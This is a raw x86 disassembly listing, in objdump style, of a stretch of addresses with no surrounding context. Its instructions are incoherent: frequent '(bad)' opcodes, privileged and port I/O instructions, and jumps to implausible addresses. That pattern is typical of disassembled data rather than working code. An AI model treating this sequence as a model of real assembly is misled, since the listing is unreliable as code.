  416929:	xor    DWORD PTR [ebx],ebp
  41692b:	dec    edx
  41692c:	xchg   ebp,eax
  41692d:	dec    esp
  41692e:	mov    ebp,0xadfb377a
  416933:	cmc    
  416934:	out    0xa,al
  416936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416937:	jae    0x416953
  416939:	shr    BYTE PTR [ebp+0x67],0x24
  41693d:	(bad)  
  41693e:	rol    DWORD PTR [esi],1
  416940:	jbe    0x4168cf
  416942:	cmc    
  416943:	pop    ds
  416944:	xchg   esp,eax
  416945:	sub    ch,0x9c
  416948:	sub    cl,BYTE PTR [ecx+0xc5f90b8]
  41694e:	xchg   edi,eax
  41694f:	jbe    0x41691e
  416951:	push   ebp
  416952:	xchg   ecx,eax
  416953:	fdiv   QWORD PTR [ebp+0x5]
  416956:	ret    
  416957:	xlat   BYTE PTR ds:[ebx]
  416958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416959:	leave  
  41695a:	ret    
  41695b:	retf   
  41695c:	add    ebp,esp
  41695e:	cmp    eax,0x55290bb
  416963:	iret   
  416964:	bound  esi,QWORD PTR [ebp-0x76]
  416967:	fst    st(5)
  416969:	sbb    edi,esp
  41696b:	sbb    al,0xa2
  41696e:	adc    ebx,DWORD PTR [edx+0x6bf1dfb7]
  416974:	enter  0xa414,0xd0
  416978:	add    eax,0x500646bc
  41697d:	sub    esi,ecx
  41697f:	aaa    
  416980:	mov    bh,0x4d
  416982:	stos   DWORD PTR es:[edi],eax
  416983:	in     al,0xe
  416985:	and    esi,eax
  416987:	shr    BYTE PTR [ecx+esi*4-0x569ad14b],0xc5
  41698f:	aas    
  416990:	loop   0x41693f
  416992:	adc    eax,DWORD PTR [edi-0x6]
  416995:	jge    0x416991
  416997:	dec    edx
  416998:	push   esi
  416999:	pop    ss
  41699a:	in     al,0x1d
  41699c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41699d:	out    dx,eax
  41699e:	in     al,0x17
  4169a0:	or     DWORD PTR [edx-0x581327b8],0x582f383f
  4169aa:	jg     0x4169ee
  4169ac:	test   BYTE PTR [ecx],0xb5
  4169af:	mov    ch,al
  4169b1:	out    0xdd,al
  4169b3:	pop    esp
  4169b4:	adc    al,0xd2
  4169b6:	pop    ebx
  4169b7:	adc    DWORD PTR [ecx+0x48],ebp
  4169ba:	rol    ebx,0xbc
  4169bd:	(bad)  
  4169be:	mov    dl,0x1c
  4169c0:	call   0xd767f281
  4169c5:	jno    0x4169d0
  4169c7:	cmp    eax,0x172c5ff4
  4169cc:	pop    edx
  4169cd:	sub    dh,BYTE PTR [ebx+0x7d]
  4169d0:	pop    ds
  4169d1:	xchg   ebx,eax
  4169d2:	mov    es,WORD PTR [eax+0x484f905e]
  4169d8:	adc    al,0xce
  4169da:	adc    al,0x4a
  4169dc:	int    0x46
  4169de:	xor    DWORD PTR [esi-0x1e],0xa113ce1b
  4169e5:	adc    edi,DWORD PTR [ecx+edi*4]
  4169e8:	dec    ecx
  4169e9:	sti    
  4169ea:	div    DWORD PTR [ebp+0x388c68f]
  4169f0:	lds    esi,FWORD PTR [ebp-0x65]
  4169f3:	and    esp,DWORD PTR [edi]
  4169f5:	cmp    al,0x1f
  4169f7:	inc    eax
  4169f8:	icebp  
  4169f9:	and    DWORD PTR [ebx],0xffffffc8
  4169fc:	cmc    
  4169fd:	test   eax,0x78e635d9
  416a02:	in     al,0x48
  416a04:	leave  
  416a05:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  416a07:	lahf   
  416a08:	cwde   
  416a09:	ror    BYTE PTR [ebx-0x41],0x3a
  416a0d:	xchg   edi,eax
  416a0e:	adc    DWORD PTR [esi-0x40],0xd8bbf1dd
  416a15:	gs cmc 
  416a17:	mov    gs,WORD PTR [edi]
  416a19:	aas    
  416a1a:	icebp  
  416a1b:	mov    bl,0x1
  416a1d:	mov    eax,0x8a9e1148
  416a22:	repz push ss
  416a24:	retf   
  416a25:	test   eax,0xefd0bdd2
  416a2a:	jl     0x416aa8
  416a2c:	sbb    bh,ah
  416a2e:	scas   eax,DWORD PTR es:[edi]
  416a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a30:	(bad)
  416a33:	shr    BYTE PTR ds:0x5cb2f97e,0x34
  416a3a:	push   0x53
  416a3c:	xchg   edi,eax
  416a3d:	aam    0x89
  416a3f:	cwde   
  416a40:	jns    0x416a78
  416a42:	or     eax,0xce404b10
  416a47:	ins    BYTE PTR es:[edi],dx
  416a48:	dec    ecx
  416a49:	hlt    
  416a4a:	cs loope 0x416ab5
  416a4d:	dec    eax
  416a4e:	xor    eax,0x88c0b266
  416a53:	stos   DWORD PTR es:[edi],eax
  416a54:	outs   dx,BYTE PTR ds:[esi]
  416a55:	cmc    
  416a56:	sbb    DWORD PTR [edi+0x5a8cc813],edx
  416a5c:	shr    DWORD PTR [edi],cl
  416a5e:	lock lods al,BYTE PTR ds:[esi]
  416a60:	sub    al,BYTE PTR [ebx-0x71]
  416a63:	cld    
  416a64:	shr    bl,1
  416a66:	push   0x75e7286a
  416a6b:	aas    
  416a6c:	and    ah,ah
  416a6e:	stos   DWORD PTR es:[edi],eax
  416a6f:	or     bh,BYTE PTR [ecx]
  416a71:	cmp    ch,BYTE PTR [edx-0x75]
  416a74:	scas   eax,DWORD PTR es:[edi]
  416a75:	mov    eax,0x8c28d536
  416a7a:	mov    ch,BYTE PTR [esi]
  416a7c:	xchg   edi,eax
  416a7d:	dec    eax
  416a7e:	pushf  
  416a7f:	and    DWORD PTR [eax-0x2df2c701],edx
  416a85:	ins    DWORD PTR es:[edi],dx
  416a86:	not    BYTE PTR [ebp+0x3f41d9b8]
  416a8c:	fnsave [esi]
  416a8e:	mov    cl,0x22
  416a90:	jb     0x416a99
  416a92:	fdivr  DWORD PTR [ebx-0x21852df3]
  416a98:	(bad)  
  416a99:	fnsave [ebx-0x44]
  416a9c:	imul   eax,DWORD PTR ds:0x46237fe1,0x26
  416aa3:	loope  0x416aa1
  416aa5:	fisub  WORD PTR [eax+0xd]
  416aa8:	rcl    DWORD PTR [edx],cl
  416aaa:	mov    ecx,0x135d7e3
  416aaf:	sbb    BYTE PTR [edi-0x358a9de4],ah
  416ab5:	sub    BYTE PTR [ebp-0x2],dl
  416ab8:	ins    BYTE PTR es:[edi],dx
  416ab9:	(bad)  [ecx-0x58251b9d]
  416abf:	cmp    DWORD PTR [ecx+0x2],ebx
  416ac2:	jne    0x416b1d
  416ac4:	(bad)  [ebp+0x15abced0]
  416aca:	test   DWORD PTR [eax-0xfe64da7],esi
  416ad0:	mov    cs,WORD PTR [esp+esi*2]
  416ad3:	cdq    
  416ad4:	cwde   
  416ad5:	xchg   BYTE PTR [ebx+0x18],bh
  416ad8:	call   0x94ba:0x2930e848
  416adf:	cmp    DWORD PTR [ecx+edx*2-0x59],edx
  416ae3:	clc    
  416ae4:	leave  
  416ae5:	out    0x76,eax
  416ae7:	and    al,0x55
  416ae9:	adc    al,0x9f
  416aeb:	jp     0x416afd
  416aed:	cmp    DWORD PTR [ecx+0x38b81cf9],0xfffffff9
  416af4:	mov    al,ds:0xccad2197
  416af9:	add    DWORD PTR ds:[edi-0x5ed0afcd],ebx
  416b00:	cmc    
  416b01:	inc    ebp
  416b02:	push   ebp
  416b03:	xchg   ebx,eax
  416b04:	in     eax,0x29
  416b06:	aad    0xc
  416b08:	cli    
  416b09:	xchg   dl,ch
  416b0b:	fnstenv [ecx+0x13]
  416b0e:	mov    ebx,0xc6767684
  416b13:	push   0xffffffd9
  416b15:	in     al,0xbd
  416b17:	adc    al,bl
  416b19:	test   al,0xaf
  416b1b:	ret    
  416b1c:	xchg   ebx,eax
  416b1d:	aam    0xb0
  416b1f:	and    edi,esi
  416b21:	(bad)  
  416b22:	cmc    
  416b23:	inc    edx
  416b24:	sbb    BYTE PTR [ebp+0x6f],0x51
  416b28:	and    BYTE PTR [edi+0x2f],dl
  416b2b:	mov    esp,0x45185029
  416b30:	test   eax,0xd199af95
  416b35:	lock jae 0x416af0
  416b38:	mov    dh,0xf0
  416b3a:	xor    esp,DWORD PTR [eax]
  416b3c:	add    al,BYTE PTR [edx-0x5b]
  416b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b40:	adc    eax,0xc26116b1
  416b45:	xchg   edx,eax
  416b46:	test   BYTE PTR [ebp-0x36424bc7],dh
  416b4c:	icebp  
  416b4d:	sub    al,0xdc
  416b4f:	aad    0xac
  416b51:	jbe    0x416b0b
  416b53:	add    dh,bh
  416b55:	mov    dl,0x91
  416b57:	adc    BYTE PTR [ecx+0x3d201c02],cl
  416b5d:	in     eax,0x23
  416b5f:	mov    esi,cs
  416b61:	(bad)  
  416b62:	cmp    al,0x6c
  416b64:	jb     0x416b5a
  416b66:	push   esi
  416b67:	pop    edi
  416b68:	fimul  WORD PTR [esi-0x2d0132dc]
  416b6e:	(bad)  
  416b6f:	jge    0x416b4b
  416b71:	retf   0x7ffe
  416b74:	mov    ds:0xc3ca9993,eax
  416b79:	dec    esi
  416b7a:	arpl   WORD PTR ds:0x5ca68af9,di
  416b80:	vmwrite ebx,esp
  416b83:	loop   0x416bd6
  416b85:	enter  0x7419,0x8a
  416b89:	pusha  
  416b8a:	mov    bl,0xe3
  416b8c:	xchg   edi,eax
  416b8d:	daa    
  416b8e:	cmp    edx,ebx
  416b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b91:	push   ss
  416b92:	mov    esi,0x6e8bb313
  416b97:	fwait
  416b98:	test   DWORD PTR [ebp-0x11],0xe1a559a2
  416b9f:	sbb    BYTE PTR [ecx+ebp*1+0x44b8adf2],dh
  416ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ba7:	out    dx,eax
  416ba8:	jns    0x416bc2
  416baa:	daa    
  416bab:	jmp    0x416bea
  416bad:	ror    DWORD PTR [edx+0x69e1d058],0xc7
  416bb4:	adc    bl,al
  416bb6:	test   al,0xd4
  416bb8:	(bad)  
  416bb9:	sbb    bl,BYTE PTR [esi+eiz*2+0x28]
  416bbd:	mov    edx,0x2b9eb2c2
  416bc2:	cdq    
  416bc3:	div    DWORD PTR [edi+0x5cdd5e67]
  416bc9:	add    al,0x58
  416bcb:	push   ds
  416bcc:	jbe    0x416c44
  416bce:	outs   dx,DWORD PTR ds:[esi]
  416bcf:	dec    edx
  416bd0:	fdiv   DWORD PTR [edx]
  416bd2:	nop
  416bd3:	xchg   edx,eax
  416bd4:	mov    edi,0x6ca58ee3
  416bd9:	sbb    DWORD PTR [esi-0x34],edx
  416bdc:	inc    ecx
  416bdd:	cmp    ah,ch
  416bdf:	scas   al,BYTE PTR es:[edi]
  416be0:	in     al,dx
  416be1:	mov    ch,BYTE PTR [edx]
  416be3:	sub    BYTE PTR cs:[edi+0x14],dl
  416be7:	mov    dl,0x99
  416be9:	pop    ebx
  416bea:	cmp    BYTE PTR [edi],dh
  416bec:	pop    ss
  416bed:	into   
  416bee:	sysret 
  416bf0:	test   BYTE PTR [ebx],al
  416bf2:	inc    eax
  416bf3:	jae    0x416c6f
  416bf5:	lods   eax,DWORD PTR ds:[esi]
  416bf6:	imul   esi,ecx,0xffffffd6
  416bf9:	cmp    eax,0xef3d7d32
  416bfe:	sbb    al,0xef
  416c00:	retf   0xd096
  416c03:	pop    ds
  416c04:	dec    esi
  416c05:	xchg   edi,eax
  416c06:	xchg   ecx,eax
  416c07:	pop    ebp
  416c08:	(bad)  [eax]
  416c0a:	inc    edi
  416c0b:	les    ebp,FWORD PTR [esi+0x78]
  416c0e:	pop    es
  416c0f:	clc    
  416c10:	mov    ch,0x5c
  416c12:	lahf   
  416c13:	mov    al,BYTE PTR [esi]
  416c15:	inc    ecx
  416c16:	xor    BYTE PTR [edx],bh
  416c18:	and    DWORD PTR [edi-0x5c],esi
  416c1b:	push   0xea88d778
  416c20:	jns    0x416bfb
  416c22:	xor    ah,ch
  416c24:	rcr    DWORD PTR [edi+eax*2-0x56],cl
  416c28:	(bad)  
  416c29:	shl    cl,cl
  416c2b:	pop    ebx
  416c2c:	mov    al,ds:0x933561fa
  416c31:	iret   
  416c32:	sbb    al,0x92
  416c34:	and    edi,esp
  416c36:	mov    ebp,0xd8f0c1c9
  416c3b:	mov    DWORD PTR [esi-0x72],edi
  416c3e:	jg     0x416bf5
  416c40:	fwait
  416c41:	imul   edx,DWORD PTR [edx],0x7b3e6515
  416c47:	push   eax
  416c48:	jne    0x416c3b
  416c4a:	test   BYTE PTR [esi+0x24],bh
  416c4d:	mov    esi,0x8ee8104d
  416c52:	movq   mm2,QWORD PTR [edi-0x46]
  416c56:	lds    ebx,FWORD PTR [ecx+0x2f]
  416c59:	pop    esi
  416c5a:	pop    ecx
  416c5b:	inc    esp
  416c5c:	ins    BYTE PTR es:[edi],dx
  416c5d:	and    ebx,ebx
  416c5f:	pop    eax
  416c60:	inc    ebx
  416c61:	int    0xcb
  416c63:	loop   0x416c2a
  416c65:	sub    esi,esp
  416c67:	adc    BYTE PTR [edi],ah
  416c69:	ins    BYTE PTR es:[edi],dx
  416c6a:	pop    esi
  416c6b:	mov    ecx,0x1f570be7
  416c70:	ror    bl,cl
  416c72:	inc    ecx
  416c73:	jmp    0x23497b66
  416c78:	add    BYTE PTR [edi],dh
  416c7a:	jmp    0xb72:0xe4ce38aa
  416c81:	(bad)  
  416c82:	cmp    esp,esp
  416c84:	mov    edi,0x44ad8da4
  416c89:	push   cs
  416c8a:	jmp    0x416c18
  416c8c:	call   0x91b058e1
  416c91:	bound  edi,QWORD PTR [eax]
  416c93:	inc    ecx
  416c94:	xchg   edi,eax
  416c95:	sbb    ebp,DWORD PTR [ecx-0x1fe24fd4]
  416c9b:	mov    bh,0xb4
  416c9d:	adc    ebx,DWORD PTR [edi]
  416c9f:	adc    edx,0x35
  416ca2:	mov    al,0x32
  416ca4:	loopne 0x416ce2
  416ca6:	add    dh,BYTE PTR ds:0x11751fe6
  416cac:	or     eax,0x9ab42bcc
  416cb1:	jl     0x416cbd
  416cb3:	and    al,0xec
  416cb5:	add    esi,DWORD PTR [eax+ecx*8]
  416cb8:	hlt    
  416cb9:	inc    esp
  416cba:	stc    
  416cbb:	inc    edx
  416cbc:	sti    
  416cbd:	xchg   ebx,eax
  416cbe:	hlt    
  416cbf:	adc    BYTE PTR [esi-0x20a59f1a],0x56
  416cc6:	jno    0x416c78
  416cc8:	xor    DWORD PTR [edx],ebx
  416cca:	jecxz  0x416c60
  416ccc:	push   eax
  416ccd:	and    BYTE PTR [edi+0x682ff84],al
  416cd3:	rol    BYTE PTR [ebx-0x2919fb54],cl
  416cd9:	loopne 0x416d19
  416cdb:	adc    BYTE PTR [ebp+0x57c8caf6],ah
  416ce1:	sahf   
  416ce2:	jno    0x416cc0
  416ce4:	enter  0x2f32,0xf0
  416ce8:	iret   
  416ce9:	cs popw ss
  416cec:	test   BYTE PTR [eax+0x19],dh
  416cef:	out    dx,eax
  416cf0:	mov    WORD PTR [edi],fs
  416cf2:	add    bl,BYTE PTR [ebx+edx*1]
  416cf5:	pop    edx
  416cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cf7:	pop    ebp
  416cf8:	jmp    0x7a52f779
  416cfd:	add    eax,0xec43090
  416d02:	call   DWORD PTR [ecx]
  416d04:	ins    BYTE PTR es:[edi],dx
  416d05:	sub    dh,dh
  416d07:	test   eax,0xe9edecd3
  416d0c:	lock (bad) 
  416d0e:	pop    ss
  416d0f:	mov    bh,0x56
  416d11:	addr16 jle 0x416d38
  416d14:	sbb    DWORD PTR [edi+0x6d763f2],esp
  416d1a:	mov    BYTE PTR [ebx],dl
  416d1c:	push   es
  416d1d:	xchg   DWORD PTR ds:0xe1335fac,ebp
  416d23:	xor    esp,DWORD PTR ds:0x1855e633
  416d29:	inc    edi
  416d2a:	sar    BYTE PTR [esi],1
  416d2c:	xchg   BYTE PTR [eax+0x72d127a7],dl
  416d32:	test   BYTE PTR ds:[esp+ebp*4-0x9],al
  416d37:	jns    0x416cf3
  416d39:	mov    ah,0x1
  416d3b:	neg    BYTE PTR [ebp+eiz*2+0x42f63dbb]
  416d42:	push   eax
  416d43:	or     BYTE PTR [edi],ch
  416d45:	mov    esp,0x30a4f62e
  416d4a:	cmp    ebx,DWORD PTR [ecx]
  416d4c:	xlat   BYTE PTR ds:[ebx]
  416d4d:	call   0xa217:0xb1085e3c
  416d54:	pop    esp
  416d55:	add    dl,bh
  416d57:	imul   ebp,DWORD PTR [esi+0x506d555f],0x18
  416d5e:	inc    ebx
  416d5f:	jnp    0x416dd2
  416d61:	fwait
  416d62:	push   0x31
  416d64:	mov    edx,0xad03289f
  416d69:	cvtps2pi mm6,QWORD PTR [ebx+0x7ffad29d]
  416d70:	add    eax,0x7acfe495
  416d75:	lock jge 0x416d9e
  416d78:	cmp    dl,BYTE PTR [esi-0x2b0c49ad]
  416d7e:	scas   eax,DWORD PTR es:[edi]
  416d7f:	sbb    al,0xe3
  416d81:	xchg   ecx,eax
  416d82:	jne    0x416dbe
  416d84:	mov    ch,0x69
  416d86:	push   esp
  416d87:	push   es
  416d88:	or     eax,0x954bad78
  416d8d:	adc    ah,BYTE PTR [edx]
  416d8f:	jmp    0x5e5f:0x8144d95d
  416d96:	add    al,BYTE PTR [eax-0x3a]
  416d99:	outs   dx,DWORD PTR ds:[esi]
  416d9a:	fcomip st,st(0)
  416d9c:	test   al,0x5
  416d9e:	imul   edx,eax,0x40be9281
  416da4:	fiadd  WORD PTR [ecx]
  416da6:	inc    esi
  416da7:	pop    edi
  416da8:	sbb    dl,BYTE PTR [edx]
  416daa:	push   edi
  416dab:	fisttp WORD PTR [edi-0x22]
  416dae:	mov    dl,0x1e
  416db0:	or     bh,BYTE PTR [ebp+0x6a]
  416db3:	inc    ecx
  416db4:	push   ss
  416db5:	inc    ebx
  416db6:	stos   DWORD PTR es:[edi],eax
  416db7:	inc    edi
  416db8:	(bad)  
  416db9:	fxch   st(7)
  416dbb:	xor    ebp,ebp
  416dbd:	int3   
  416dbe:	xchg   edi,eax
  416dbf:	mov    edx,0xc4301301
  416dc4:	cmc    
  416dc5:	or     eax,0xcca01092
  416dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dcb:	fwait
  416dcc:	aad    0x74
  416dce:	adc    esi,DWORD PTR [ecx]
  416dd0:	mov    BYTE PTR [di-0x5],0x86
  416dd5:	pop    ebp
  416dd6:	dec    DWORD PTR [ecx+edi*1-0x3]
  416dda:	(bad)  
  416ddb:	mov    dl,0x4b
  416ddd:	push   edx
  416dde:	arpl   di,bx
  416de0:	add    DWORD PTR [edx],eax
  416de2:	scas   eax,DWORD PTR es:[edi]
  416de3:	mov    dl,0xbc
  416de5:	push   ds
  416de6:	retf   
  416de7:	mov    bh,0xe6
  416de9:	push   ss
  416dea:	push   edx
  416deb:	xchg   edx,eax
  416dec:	fs add edx,ebp
  416def:	or     cl,al
  416df1:	pop    ebp
  416df2:	pop    edx
  416df3:	and    esi,DWORD PTR [edi-0x2228ff86]
  416df9:	push   esi
  416dfa:	mov    ah,0x31
  416dfc:	add    al,0x98
  416dfe:	fidivr DWORD PTR [esi+ebp*2+0x785ba348]
  416e05:	into   
  416e06:	cmp    bh,BYTE PTR [edi+0x29]
  416e09:	scas   al,BYTE PTR es:[edi]
  416e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e0b:	lods   al,BYTE PTR ds:[esi]
  416e0c:	jno    0x416e45
  416e0e:	add    al,0xfa
  416e10:	das    
  416e11:	bound  ebx,QWORD PTR [esi-0x5076c232]
  416e17:	cmp    DWORD PTR [edi],edx
  416e19:	add    eax,0xf16f1e97
  416e1e:	xor    ah,dl
  416e20:	es mov bl,0x4c
  416e23:	dec    esi
  416e24:	ret    
  416e25:	xchg   edx,eax
  416e26:	jbe    0x4beac3d9
  416e2c:	lods   al,BYTE PTR gs:[esi]
  416e2e:	xchg   ebx,eax
  416e2f:	sbb    ah,ch
  416e31:	into   
  416e32:	mov    ch,0xaa
  416e34:	add    BYTE PTR [ecx-0x3b1b4065],0x8c
  416e3b:	(bad)  
  416e3c:	pop    ecx
  416e3d:	test   al,0xfe
  416e3f:	outs   dx,DWORD PTR ds:[esi]
  416e40:	pop    edx
  416e41:	leave  
  416e42:	ja     0x416e48
  416e44:	mov    ds:0x1c17b91,al
  416e49:	and    BYTE PTR [esi],0x1f
  416e4c:	cld    
  416e4d:	sbb    DWORD PTR [ecx-0x6cd51cc9],0x8c1c4382
  416e57:	mov    ss,WORD PTR [ecx]
  416e59:	xor    eax,0x838c6705
  416e5e:	xor    eax,0xdabd4693
  416e63:	cmp    esp,DWORD PTR [ecx+0x7414aef4]
  416e69:	aad    0x6a
  416e6b:	add    eax,0xf7ad6aaf
  416e70:	jno    0x416e4d
  416e72:	in     al,0x2b
  416e74:	cmp    eax,edx
  416e76:	and    eax,DWORD PTR [ecx+ebp*4+0x7e4d506]
  416e7d:	cld    
  416e7e:	push   DWORD PTR [edi-0x7e]
  416e81:	xor    al,0xda
  416e84:	(bad)  
  416e85:	or     DWORD PTR [edi],eax
  416e87:	inc    ebx
  416e88:	mov    esp,0xc52d31a2
  416e8d:	adc    DWORD PTR [edx],edx
  416e8f:	adc    DWORD PTR [ecx],ecx
  416e91:	(bad)  
  416e92:	idiv   DWORD PTR [edi]
  416e94:	nop
  416e95:	inc    esi
  416e96:	(bad)  
  416e97:	add    dh,bl
  416e99:	mov    esi,0x585c58e8
  416e9e:	dec    BYTE PTR [esi]
  416ea0:	dec    edi
  416ea1:	push   0x63
  416ea3:	and    eax,0xe
  416ea6:	pushf  
  416ea7:	enter  0x5acd,0x9
  416eab:	das    
  416eac:	outs   dx,DWORD PTR ds:[si]
  416eae:	xchg   ebx,eax
  416eaf:	mov    ch,0x3c
  416eb1:	into   
  416eb2:	lods   al,BYTE PTR ds:[esi]
  416eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eb4:	xchg   dh,dh
  416eb6:	int    0xb1
  416eb8:	adc    eax,0x17ac597f
  416ebd:	or     DWORD PTR [edx-0x1daae193],eax
  416ec3:	xchg   ebx,eax
  416ec4:	rcl    BYTE PTR [eax-0x7175a234],1
  416eca:	xchg   ebx,eax
  416ecb:	dec    ebp
  416ecc:	jae    0x416f35
  416ece:	nop
  416ecf:	cmc    
  416ed0:	clc    
  416ed1:	iret   
  416ed2:	mov    eax,0x4f7d4ad5
  416ed7:	mov    ebx,0x95c29196
  416edc:	test   eax,0x19257dcf
  416ee1:	jmp    0xa5391e34
  416ee6:	mov    ah,0x23
  416ee8:	and    BYTE PTR [ecx-0x40c8685c],al
  416eee:	int3   
  416eef:	xchg   BYTE PTR [edi+0x44],bh
  416ef2:	sbb    ebx,esi
  416ef4:	repnz push edi
  416ef6:	cs push ebp
  416ef8:	sbb    al,0x61
  416efa:	or     bh,BYTE PTR [ecx+ebx*4]
  416efd:	add    eax,0xe0d20a81
  416f02:	in     eax,0xcf
  416f04:	xchg   edi,eax
  416f05:	cmp    eax,0xf47b26bd
  416f0a:	loope  0x416f2e
  416f0c:	fwait
  416f0d:	xor    al,0xb9
  416f0f:	xchg   ecx,eax
  416f10:	popf   
  416f11:	faddp  st(2),st
  416f13:	(bad)  
  416f14:	sar    BYTE PTR [ebx+0x4d0fa742],1
  416f1a:	cmp    al,0xc6
  416f1c:	aas    
  416f1d:	sbb    al,0x90
  416f1f:	sbb    al,0xb8
  416f21:	jno    0x416eb7
  416f23:	(bad)  
  416f24:	xor    dl,BYTE PTR [ebx-0x3c945c44]
  416f2a:	sbb    DWORD PTR [edi-0x1c55a96],ebp
  416f30:	push   ds
  416f31:	aas    
  416f32:	out    dx,eax
  416f33:	call   0xe45e98e2
  416f38:	pop    eax
  416f39:	add    DWORD PTR ds:0x2f92b8d5,edi
  416f3f:	scas   al,BYTE PTR es:[edi]
  416f40:	leave  
  416f41:	fsub   QWORD PTR [ebp+0x57]
  416f44:	and    eax,0x872426d2
  416f49:	jne    0x416ecf
  416f4b:	or     eax,0x18bd1340
  416f50:	add    BYTE PTR [eax-0x76],0xa3
  416f54:	xchg   BYTE PTR [ebp+0x7e142350],bl
  416f5a:	idiv   BYTE PTR [esi-0x7d738694]
  416f60:	xchg   esi,eax
  416f61:	out    dx,eax
  416f62:	fadd   DWORD PTR [edx+eax*4-0x2d]
  416f66:	pop    edi
  416f67:	sub    DWORD PTR [ebx-0x62],esi
  416f6a:	enter  0xec58,0x74
  416f6e:	fstp   DWORD PTR [ecx+0x14]
  416f71:	repnz mov ecx,0x27c9e3bb
  416f77:	or     eax,0x7931c69e
  416f7c:	sbb    edi,eax
  416f7e:	pop    ebp
  416f7f:	push   eax
  416f80:	dec    edi
  416f81:	(bad)  
  416f82:	cmc    
  416f83:	stc    
  416f84:	adc    ch,0x8f
  416f87:	(bad)  
  416f88:	sbb    DWORD PTR [edi+0x5b],0x4b
  416f8c:	int3   
  416f8d:	sub    dh,BYTE PTR [edi+edi*1]
  416f90:	aaa    
  416f91:	mov    ds:0x65209e28,eax
  416f96:	mov    ds:0x9b55aa89,eax
  416f9b:	push   cs
  416f9c:	inc    BYTE PTR [esi+0x5f]
  416f9f:	sub    DWORD PTR [edx+0x361d76db],ecx
  416fa5:	pusha  
  416fa6:	mov    esi,0x7fa20a20
  416fab:	mov    WORD PTR fs:[edx-0x57],?
  416faf:	jp     0x41701f
  416fb1:	xor    dl,BYTE PTR [esi]
  416fb3:	sahf   
  416fb4:	add    eax,0x603ce01
  416fb9:	into   
  416fba:	lock add eax,0x314b2141
  416fc0:	pop    es
  416fc1:	pop    esp
  416fc2:	lods   eax,DWORD PTR ds:[esi]
  416fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fc4:	mov    BYTE PTR [esi],ch
  416fc6:	mov    edx,0x286f1116
  416fcb:	and    BYTE PTR [edi-0x802a194],cl
  416fd1:	scas   al,BYTE PTR es:[edi]
  416fd2:	scas   al,BYTE PTR es:[edi]
  416fd3:	add    al,0x8f
  416fd5:	les    esp,FWORD PTR [edi+0x1a152252]
  416fdb:	lods   eax,DWORD PTR ds:[esi]
  416fdc:	pop    ebx
  416fdd:	push   cs
  416fde:	dec    ecx
  416fdf:	loopne 0x416f85
  416fe1:	lds    ebx,FWORD PTR [edi]
  416fe3:	add    al,0x38
  416fe5:	xchg   edi,eax
  416fe6:	ret    0x7a94
  416fe9:	ds and al,0x88
  416fec:	test   DWORD PTR ds:0x6ac233e9,ecx
  416ff2:	push   ebp
  416ff3:	xchg   BYTE PTR [eax],al
  416ff5:	jmp    0x614f:0x38ce34e1
  416ffc:	xchg   ebx,eax
  416ffd:	cwde   
  416ffe:	or     esi,DWORD PTR [esi-0x5f]
  417001:	cmp    DWORD PTR [ebx],ebp
  417003:	pusha  
  417004:	adc    eax,0xa774bc54
  417009:	pop    eax
  41700a:	fcom   QWORD PTR [esi]
  41700c:	pop    ebp
  41700d:	xchg   esp,eax
  41700e:	sub    bl,al
  417010:	daa    
  417011:	add    eax,0x877442f1
  417016:	or     BYTE PTR [ecx],0xa1
  417019:	scas   al,BYTE PTR es:[edi]
  41701a:	mov    bh,0xc6
  41701c:	loopne 0x416fd3
  41701e:	iret   
  41701f:	scas   al,BYTE PTR es:[edi]
  417020:	imul   al
  417022:	adc    ecx,eax
  417024:	test   al,0x81
  417026:	(bad)  
  417027:	xor    eax,0x70360973
  41702c:	dec    esp
  41702d:	sbb    esi,DWORD PTR [esi-0x15]
  417030:	jge    0x4170aa
  417032:	retf   0x2074
  417035:	xchg   ecx,eax
  417036:	gs mov al,0xbe
  417039:	jmp    0x416ff4
  41703b:	(bad)  
  41703c:	hlt    
  41703d:	push   esp
  41703e:	mov    ds:0x82e22c59,al
  417043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417044:	jg     0x417089
  417046:	inc    ecx
  417047:	cmp    BYTE PTR [ecx-0x44],0x83
  41704b:	cli    
  41704c:	add    al,BYTE PTR [edx+0x33]
  41704f:	adc    DWORD PTR [edi+ecx*8],esi
  417052:	jno    0x416ffd
  417054:	(bad)  
  417055:	jecxz  0x41709f
  417057:	mov    al,0x41
  417059:	adc    edi,DWORD PTR [edi]
  41705b:	outs   dx,BYTE PTR ds:[esi]
  41705c:	sti    
  41705d:	fmulp  st(5),st
  41705f:	shr    BYTE PTR [eax],cl
  417061:	dec    edx
  417062:	pop    esp
  417063:	sbb    dh,BYTE PTR [eax-0x13e1d3b0]
  417069:	xor    DWORD PTR [ebp+0x34f79b0],edx
  41706f:	xchg   edi,eax
  417070:	jmp    0x798ba072
  417075:	sbb    edi,DWORD PTR [esi]
  417077:	add    eax,0x33e5682e
  41707c:	in     al,0xa2
  41707e:	ds mov dh,0xe8
  417081:	pop    ebp
  417082:	jmp    0x594c2fe
  417087:	pop    es
  417088:	loop   0x417085
  41708a:	sbb    esp,DWORD PTR [esi+0x132f2faa]
  417090:	adc    BYTE PTR [esi+0x152d4622],dh
  417096:	stos   DWORD PTR es:[edi],eax
  417097:	loopne 0x4170f1
  417099:	data16 mov dh,al
  41709c:	fs loope 0x4170f1
  41709f:	in     eax,0x93
  4170a1:	test   esi,ebp
  4170a3:	loop   0x417107
  4170a5:	mov    ds:0x6a37eef2,eax
  4170aa:	cdq    
  4170ab:	xlat   BYTE PTR ds:[ebx]
  4170ac:	call   0xf819:0xcde2b0b0
  4170b3:	xor    eax,0x54feb2b1
  4170b8:	pop    ds
  4170b9:	xchg   BYTE PTR [ebp+edi*4-0x46],dl
  4170bd:	xchg   esp,eax
  4170be:	rcl    BYTE PTR [ecx-0x47aa970a],1
  4170c4:	ds repnz nop
